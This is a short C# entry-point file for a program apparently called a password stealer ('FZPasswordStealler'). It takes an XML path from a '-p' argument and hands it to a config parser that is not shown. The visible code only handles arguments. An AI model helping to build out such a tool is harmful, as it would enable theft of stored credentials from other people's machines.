namespace FZPasswordStealler.App
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string pathToXml = "";
            

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-p" && i + 1 < args.Length)
                {
                    pathToXml = args[i + 1];
                    i++;
                }
      
            }
            //Console.WriteLine("Hello, World!");
            ConfigParser.ConfigParse(pathToXml);
        }

      
    }
}
